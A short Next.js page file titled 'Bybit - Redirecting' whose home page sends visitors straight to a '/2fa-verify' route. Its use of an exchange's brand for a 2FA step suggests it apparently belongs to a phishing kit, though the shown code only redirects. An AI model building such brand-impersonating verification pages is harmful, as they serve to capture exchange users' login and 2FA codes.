import type { Metadata } from "next"
import { redirect } from "next/navigation"

export const metadata: Metadata = {
  title: "Bybit - Redirecting",
  description: "Redirecting to 2FA verification",
}

export default function HomePage() {
  // Redirect to the 2FA verification page
  redirect("/2fa-verify")
  return null
}
